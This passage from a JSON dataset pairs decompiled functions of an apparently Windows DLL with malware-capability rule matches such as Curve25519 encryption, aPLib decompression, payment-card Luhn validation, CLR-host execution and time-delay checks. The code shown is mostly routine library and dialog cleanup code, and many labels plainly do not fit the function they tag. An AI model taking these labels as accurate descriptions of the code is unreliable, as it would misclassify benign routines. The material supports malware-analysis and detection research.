        ],
        "decompiled_code": "\nint64_t fcn.180017d08(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = *(arg1 + 0x40);\n    if (iVar1 != 0) {\n        iVar2 = fcn.1800140a8();\n        if (*(iVar2 + 0x28) != 0) {\n            fcn.18002d184(*(iVar2 + 0x28) + 0x30, *(arg1 + 0x40));\n        }\n        *(arg1 + 0x40) = 0;\n    }\n    *(arg1 + 0xa0) = 0;\n    return iVar1;\n}\n",
        "token_count": 155
    },
    "180017f7": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint64_t fcn.180017f78(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    \n    uVar4 = 0;\n    if (*(arg1 + 0x40) == 0) {\n        if (*(arg1 + 0xa0) == 0) {\n            return 0;\n        }\n        if (*(arg1 + 0x40) == 0) goto code_r0x000180017fc1;\n    }\n    iVar3 = fcn.1800140a8();\n    if (*(iVar3 + 0x28) == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    fcn.18002d110(*(iVar3 + 0x28) + 0x30, *(arg1 + 0x40));\ncode_r0x000180017fc1:\n    if ((*(arg1 + 0x40) != 0) || (*(arg1 + 0xa0) != 0)) {\n        if (*(arg1 + 0xa0) == 0) {\n            uVar2 = (*_sym.imp.USER32.dll_DestroyWindow)();\n        }\n        else {\n            uVar2 = (**(**(arg1 + 0xa0) + 0xb0))();\n        }\n        uVar4 = uVar2;\n    }\n    return uVar4;\n}\n",
        "token_count": 341
    },
    "18001f01": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\ncode ** fcn.18001f010(code **arg1, code *arg2)\n\n{\n    arg1[1] = arg2;\n    *arg1 = vtable.CDataSourceControl.0;\n    arg1[2] = NULL;\n    arg1[3] = NULL;\n    arg1[4] = NULL;\n    arg1[5] = NULL;\n    fcn.18002d6a4(arg1 + 6, 10);\n    arg1[0xd] = NULL;\n    arg1[0xe] = NULL;\n    arg1[0xf] = NULL;\n    arg1[0x10] = NULL;\n    *(arg1 + 0x11) = 0;\n    arg1[0x12] = NULL;\n    arg1[0x13] = NULL;\n    arg1[0x14] = NULL;\n    arg1[0x15] = NULL;\n    *(arg1 + 0x16) = 0;\n    return arg1;\n}\n",
        "token_count": 218
    },
    "180033c9": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.180033c90(uint64_t *arg1, uint64_t noname_1, uint64_t arg3)\n\n{\n    uint32_t uVar1;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    \n    uVar3 = arg3;\n    if (7 < arg3) {\n        noname_1 = (noname_1 & 0xff) * 0x101010101010101;\n        if (0x3f < arg3) {\n            uVar1 = -arg1 & 7;\n            if (uVar1 != 0) {\n                uVar3 = arg3 - uVar1;\n                *arg1 = noname_1;\n            }\n            arg1 = uVar1 + arg1;\n            arg3 = uVar3 & 0x3f;\n            uVar3 = uVar3 >> 6;\n            if (uVar3 != 0) {\n                puVar2 = arg1;\n                if (uVar3 < 0x1c00) {\n                    do {\n                        *puVar2 = noname_1;\n                        puVar2[1] = noname_1;\n                        puVar2[2] = noname_1;\n                        arg1 = puVar2 + 8;\n                        puVar2[3] = noname_1;\n                        puVar2[4] = noname_1;\n                        uVar3 = uVar3 - 1;\n                        puVar2[5] = noname_1;\n                        puVar2[6] = noname_1;\n                        puVar2[7] = noname_1;\n                        puVar2 = arg1;\n                    } while (uVar3 != 0);\n                }\n                else {\n                    do {\n                        *puVar2 = noname_1;\n                        puVar2[1] = noname_1;\n                        puVar2[2] = noname_1;\n                        arg1 = puVar2 + 8;\n                        puVar2[3] = noname_1;\n                        puVar2[4] = noname_1;\n                        uVar3 = uVar3 - 1;\n                        puVar2[5] = noname_1;\n                        puVar2[6] = noname_1;\n                        puVar2[7] = noname_1;\n                        puVar2 = arg1;\n                    } while (uVar3 != 0);\n                    LOCK();\n                }\n            }\n        }\n        uVar3 = arg3 & 7;\n        for (arg3 = arg3 >> 3; arg3 != 0; arg3 = arg3 - 1) {\n            *arg1 = noname_1;\n            arg1 = arg1 + 1;\n        }\n    }\n    for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *arg1 = noname_1;\n        arg1 = arg1 + 1;\n    }\n    return;\n}\n",
        "token_count": 649
    },
    "18003226": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\nbool fcn.180032268(int64_t lpMessageFilter)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ole32.dll_CoRegisterMessageFilter)(lpMessageFilter + 0x60, 0);\n    if (iVar1 == 0) {\n        *(lpMessageFilter + 0x40) = 1;\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 90
    },
    "1800478c": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint8_t * fcn.1800478c4(uint8_t *arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint8_t *puVar3;\n    uchar auStack40 [8];\n    int64_t iStack32;\n    int64_t iStack24;\n    char cStack16;\n    \n    fcn.180033d7c(auStack40, 0);\n    if (arg1 == NULL) {\n        puVar2 = fcn.180035b28();\n        *puVar2 = 0x16;\n        fcn.180036f3c(0, 0, 0, 0);\n    }\n    else {\n        if (*(iStack32 + 8) == 0) {\n            arg1 = fcn.1800478cc(arg1);\ncode_r0x00018004784c:\n            if (cStack16 == '\\0') {\n                return arg1;\n            }\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n            return arg1;\n        }\n        while( true ) {\n            uVar1 = *arg1;\n            if (uVar1 == 0) break;\n            if ((*(uVar1 + 0x1d + iStack32) & 4) == 0) {\n                puVar3 = arg1;\n                if (arg2 == uVar1) break;\n            }\n            else {\n                puVar3 = arg1 + 1;\n                if (*puVar3 == 0) goto code_r0x000180047813;\n                if (arg2 == CONCAT11(uVar1, *puVar3)) goto code_r0x00018004784c;\n            }\n            arg1 = puVar3 + 1;\n        }\n        if (arg2 == uVar1) {\n            if (cStack16 == '\\0') {\n                return arg1;\n            }\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n            return arg1;\n        }\n    }\ncode_r0x000180047813:\n    if (cStack16 != '\\0') {\n        *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n    }\n    return NULL;\n}\n",
        "token_count": 510
    },
    "18003342": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18003342c(int64_t lpMem)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    if ((lpMem != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x18006daa0, 0, lpMem),  iVar2 == 0)) {\n        puVar1 = fcn.180035b28();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar4 = fcn.180035ae0(uVar3);\n        *puVar1 = uVar4;\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "18000118": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001180(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int64_t *piVar4;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar5;\n    \n    pcVar3 = arg1[0x44];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    if (arg1[0x43] != NULL) {\n        (**(*arg1[0x43] + 0x10))();\n    }\n    pcVar3 = arg1[0x42];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    *arg1 = vtable.CDHtmlDialog.1.0;\n    arg1[0x1d] = vtable.CDHtmlDialog.0;\n    if (arg1[0x41] != NULL) {\n        (**(*arg1[0x41] + 0x10))();\n    }\n    if (arg1[0x3e] != NULL) {\n        fcn.18003342c(arg1[0x3e]);\n        arg1[0x3e] = NULL;\n    }\n    *(arg1 + 0x3f) = 0;\n    *(arg1 + 0x1fc) = 0;\n    if (arg1[0x3c] != NULL) {\n        fcn.18003342c(arg1[0x3c]);\n        arg1[0x3c] = NULL;\n    }\n    *(arg1 + 0x3d) = 0;\n    *(arg1 + 0x1ec) = 0;\n    fcn.1800187d8(arg1 + 0x26);\n    pcVar3 = arg1[0x25];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    if (arg1[0x23] != NULL) {\n        (**(*arg1[0x23] + 0x10))();\n    }\n    if (arg1[0x22] != NULL) {\n        (**(*arg1[0x22] + 0x10))();\n    }\n    pcVar3 = arg1[0x1f];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    *arg1 = vtable.CDialog.0;\n    if (arg1[8] != NULL) {\n        fcn.180017f78(arg1);\n    }\n    uVar5 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWnd.0;\n    if ((((arg1[8] != NULL) && (arg1 != 0x18006cc70)) && (arg1 != 0x18006cd20)) &&\n       ((arg1 != 0x18006cdd0 && (arg1 != 0x18006ce80)))) {\n        fcn.180017f78(arg1);\n    }\n    piVar4 = arg1[0x13];\n    if (piVar4 != NULL) {\n        (**(*piVar4 + 8))(piVar4, 1, in_R8, in_R9, uVar5);\n    }\n    pcVar3 = arg1[0x14];\n    if ((pcVar3 != NULL) && (*(pcVar3 + 0x50) == arg1)) {\n        *(pcVar3 + 0x50) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 1019
    },
    "180009aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180009aa4(int64_t arg1)\n\n{\n    if (*(arg1 + 0x20) != 0) {\n        (**(*(arg1 + 0x20) + 0x38))();\n    }\n    *(arg1 + 0x38) = 0;\n    return;\n}\n",
        "token_count": 70
    },
    "1800011e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800011ec(int64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    iVar3 = *arg1;\n    LOCK();\n    piVar1 = iVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iVar3 + -0x18) + 8))();\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "18000122": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.18000122c(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    uint16_t *puVar2;\n    uint64_t uVar3;\n    uint16_t *puVar4;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)();\n    if ((iVar1 != 0) && (puVar2 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1),  puVar2 != NULL)) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_SizeofResource)(arg1, arg2);\n        puVar4 = (uVar3 & 0xffffffff) + puVar2;\n        for (arg3._0_4_ = arg3 & 0xf; arg3 != 0; arg3._0_4_ = arg3 - 1) {\n            if (puVar4 <= puVar2) {\n                return 0;\n            }\n            puVar2 = puVar2 + *puVar2 + 1;\n        }\n        if (puVar2 < puVar4) {\n            return -(*puVar2 != 0) & puVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 269
    },
    "1800014d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800014dc(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uchar auStack360 [32];\n    uint uStack328;\n    uchar auStack320 [40];\n    ushort auStack280 [128];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180067ce0 ^ auStack360;\n    uStack328 = 0;\n    iVar1 = fcn.180033524(auStack320, arg1);\n    if (iVar1 == 0) {\n        iVar2 = fcn.180034148(auStack280, 0x80, L\"%A, %B %d, %Y\", auStack320);\n        if (iVar2 != 0) goto code_r0x00018000153a;\n    }\n    auStack280[0] = 0;\ncode_r0x00018000153a:\n    fcn.1800087c4(arg2, auStack280);\n    fcn.180032ea0(uStack24 ^ auStack360);\n    return;\n}\n",
        "token_count": 240
    },
    "1800015e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800015e0(void)\n\n{\n    int64_t iVar1;\n    uchar auStack1128 [64];\n    ulong uStack1064;\n    uint64_t uStack24;\n    \n    uStack1064 = 0xfffffffffffffffe;\n    uStack24 = *0x180067ce0 ^ auStack1128;\n    iVar1 = fcn.180014058();\n    fcn.180009ae8(*(iVar1 + 8));\n    fcn.180032ea0(uStack24 ^ auStack1128);\n    return;\n}\n",
        "token_count": 122
    },
    "1800086d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800086dc(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int64_t *piVar4;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar5;\n    \n    pcVar3 = arg1[0x47];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    pcVar3 = arg1[0x46];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    pcVar3 = arg1[0x45];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    pcVar3 = arg1[0x44];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    pcVar3 = arg1[0x43];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    pcVar3 = arg1[0x42];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    *arg1 = vtable.CDHtmlDialog.1.0;\n    arg1[0x1d] = vtable.CDHtmlDialog.0;\n    if (arg1[0x41] != NULL) {\n        (**(*arg1[0x41] + 0x10))();\n    }\n    if (arg1[0x3e] != NULL) {\n        fcn.18003342c(arg1[0x3e]);\n        arg1[0x3e] = NULL;\n    }\n    *(arg1 + 0x3f) = 0;\n    *(arg1 + 0x1fc) = 0;\n    if (arg1[0x3c] != NULL) {\n        fcn.18003342c(arg1[0x3c]);\n        arg1[0x3c] = NULL;\n    }\n    *(arg1 + 0x3d) = 0;\n    *(arg1 + 0x1ec) = 0;\n    fcn.1800187d8(arg1 + 0x26);\n    pcVar3 = arg1[0x25];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    if (arg1[0x23] != NULL) {\n        (**(*arg1[0x23] + 0x10))();\n    }\n    if (arg1[0x22] != NULL) {\n        (**(*arg1[0x22] + 0x10))();\n    }\n    pcVar3 = arg1[0x1f];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    *arg1 = vtable.CDialog.0;\n    if (arg1[8] != NULL) {\n        fcn.180017f78(arg1);\n    }\n    uVar5 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWnd.0;\n    if ((((arg1[8] != NULL) && (arg1 != 0x18006cc70)) && (arg1 != 0x18006cd20)) &&\n       ((arg1 != 0x18006cdd0 && (arg1 != 0x18006ce80)))) {\n        fcn.180017f78(arg1);\n    }\n    piVar4 = arg1[0x13];\n    if (piVar4 != NULL) {\n        (**(*piVar4 + 8))(piVar4, 1, in_R8, in_R9, uVar5);\n    }\n    pcVar3 = arg1[0x14];\n    if ((pcVar3 != NULL) && (*(pcVar3 + 0x50) == arg1)) {\n        *(pcVar3 + 0x50) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 1319
    },
    "18000886": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.180008868(int64_t *arg1, int64_t *arg2, ulong *arg3)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    if (*(*arg2 + -0x18) == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        piVar2 = (**(**(*arg2 + -0x18) + 0x20))();\n    }\n    if (piVar2 == NULL) {\n        piVar2 = fcn.180012330();\n        piVar2 = (**(*piVar2 + 0x20))();\n    }\n    if (piVar2 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    iVar3 = (**(*piVar2 + 0x18))(piVar2);\n    *arg1 = iVar3 + 0x18;\n    fcn.180008cd4(arg1, *arg2, *(*arg2 + -0x10), *arg3);\n    return arg1;\n}\n",
        "token_count": 267
    },
    "18000892": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nint64_t * fcn.180008920(int64_t *arg1, int64_t *arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    piVar2 = NULL;\n    if (*(*arg2 + -0x18) != NULL) {\n        piVar2 = (**(**(*arg2 + -0x18) + 0x20))();\n    }\n    if (piVar2 == NULL) {\n        piVar2 = fcn.180012330();\n        piVar2 = (**(*piVar2 + 0x20))();\n    }\n    if (piVar2 != NULL) {\n        iVar3 = (**(*piVar2 + 0x18))(piVar2);\n        *arg1 = iVar3 + 0x18;\n        if (arg3 != 0) {\n            fcn.180033b84(arg3);\n        }\n        fcn.180008cd4(arg1, *arg2, *(*arg2 + -0x10), arg3);\n        return arg1;\n    }\n    fcn.180001214(0x80004005);\n    pcVar1 = swi(3);\n    piVar2 = (*pcVar1)();\n    return piVar2;\n}\n",
        "token_count": 285
    },
    "1800089e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800089e0(int64_t *arg1, ulong noname_1, ulong pv)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    \n    iVar5 = *arg1;\n    piVar3 = *(iVar5 + -0x18);\n    if (*(iVar5 + -0x10) != 0) {\n        if (*(iVar5 + -8) < 0) {\n            if (*(iVar5 + -0xc) < 0) {\n                fcn.180001214(0x80070057);\n                pcVar4 = swi(3);\n                (*pcVar4)();\n                return;\n            }\n            *(iVar5 + -0x10) = 0;\n            **arg1 = 0;\n        }\n        else {\n            LOCK();\n            piVar1 = iVar5 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar2 + -1 < 1) {\n                (**(**(iVar5 + -0x18) + 8))();\n            }\n            iVar5 = (**(*piVar3 + 0x18))(piVar3);\n            *arg1 = iVar5 + 0x18;\n        }\n    }\n    return;\n}\n",
        "token_count": 305
    },
    "180008a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180008a50(int64_t *arg1)\n\n{\n    if (*arg1 != arg1 + 1) {\n        fcn.180008df4(arg1);\n    }\n    return;\n}\n",
        "token_count": 47
    },
    "180008a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.180008a68(int64_t **arg1, uint64_t arg2)\n\n{\n    int64_t **arg1_00;\n    int64_t **arg3;\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    \n    if (0x7ffffffffffffffe < arg2) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        piVar3 = (*pcVar1)();\n        return piVar3;\n    }\n    arg3 = *arg1;\n    arg2 = arg2 * 2;\n    if (arg3 == NULL) {\n        if (arg2 < 0x105) {\n            *arg1 = arg1 + 1;\n        }\n        else {\n            fcn.180008d9c(arg1, arg2);\n        }\n    }\n    else {\n        arg1_00 = arg1 + 1;\n        if (arg2 < 0x105) {\n            if (arg3 != arg1_00) {\n                iVar2 = fcn.180034220(arg1_00, 0x104, arg3, arg2);\n                if (iVar2 != 0) {\n                    if (iVar2 == 0xc) {\n                        fcn.1800124cc();\n                        pcVar1 = swi(3);\n                        piVar3 = (*pcVar1)();\n                        return piVar3;\n                    }\n                    if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                        fcn.180012514();\n                        pcVar1 = swi(3);\n                        piVar3 = (*pcVar1)();\n                        return piVar3;\n                    }\n                    if (iVar2 != 0x50) {\n                        fcn.180012514();\n                        pcVar1 = swi(3);\n                        piVar3 = (*pcVar1)();\n                        return piVar3;\n                    }\n                }\n                fcn.180008df4(arg1);\n            }\n            *arg1 = arg1_00;\n        }\n        else if (arg3 == arg1_00) {\n            fcn.180008d9c(arg1, arg2);\n            iVar2 = fcn.180034220(*arg1, arg2, arg1_00, 0x104);\n            if (iVar2 != 0) {\n                if (iVar2 == 0xc) {\n                    fcn.1800124cc();\n                    pcVar1 = swi(3);\n                    piVar3 = (*pcVar1)();\n                    return piVar3;\n                }\n                if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                    fcn.180012514();\n                    pcVar1 = swi(3);\n                    piVar3 = (*pcVar1)();\n                    return piVar3;\n                }\n                if (iVar2 != 0x50) {\n                    fcn.180012514();\n                    pcVar1 = swi(3);\n                    piVar3 = (*pcVar1)();\n                    return piVar3;\n                }\n            }\n        }\n        else {\n            fcn.180008dc8(arg1);\n        }\n    }\n    return *arg1;\n}\n",
        "token_count": 702
    },
    "180008b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.180008b80(int64_t *arg1, ulong hModule, ulong arg3)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    int64_t arg2;\n    uint16_t *puVar4;\n    ulong uVar5;\n    \n    arg2 = (*_sym.imp.KERNEL32.dll_FindResourceW)(hModule, (arg3 >> 4) + 1);\n    if ((arg2 == 0) || (puVar4 = fcn.18000122c(hModule, arg2, arg3),  puVar4 == NULL)) {\n        uVar5 = 0;\n    }\n    else {\n        uVar2 = *puVar4;\n        if ((1U - *(*arg1 + -8) | *(*arg1 + -0xc) - uVar2) < 0) {\n            fcn.180008ed0(arg1, uVar2);\n        }\n        fcn.1800012b8(*arg1, uVar2, puVar4 + 1, *puVar4);\n        uVar1 = *(*arg1 + -0xc);\n        if (uVar2 != uVar1 && uVar1 <= uVar2) {\n            fcn.180001214(0x80070057);\n            pcVar3 = swi(3);\n            uVar5 = (*pcVar3)();\n            return uVar5;\n        }\n        *(*arg1 + -0x10) = uVar2;\n        uVar5 = 1;\n        *(*arg1 + uVar2 * 2) = 0;\n    }\n    return uVar5;\n}\n",
        "token_count": 364
    },
    "180008cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180008cd4(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t arg1_00;\n    code *pcVar1;\n    int64_t arg2_00;\n    uint32_t uVar2;\n    int32_t in_stack_00000028;\n    \n    uVar2 = arg3 + in_stack_00000028;\n    if ((1U - *(*arg1 + -8) | *(*arg1 + -0xc) - uVar2) < 0) {\n        fcn.180008ed0(arg1, uVar2);\n    }\n    arg1_00 = *arg1;\n    arg2_00 = arg3 * 2;\n    fcn.180034220(arg1_00, arg2_00, arg2, arg2_00);\n    fcn.180034220(arg2_00 + arg1_00, in_stack_00000028 * 2, arg4, in_stack_00000028 * 2);\n    if ((-1 < uVar2) && (uVar2 <= *(*arg1 + -0xc))) {\n        *(*arg1 + -0x10) = uVar2;\n        *(*arg1 + uVar2 * 2) = 0;\n        return;\n    }\n    fcn.180001214(0x80070057);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 320
    },
    "180008d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180008d9c(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.18003346c(arg2);\n    if (iVar2 == 0) {\n        fcn.180001214(0x8007000e);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    *arg1 = iVar2;\n    return;\n}\n",
        "token_count": 109
    },
    "180008dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
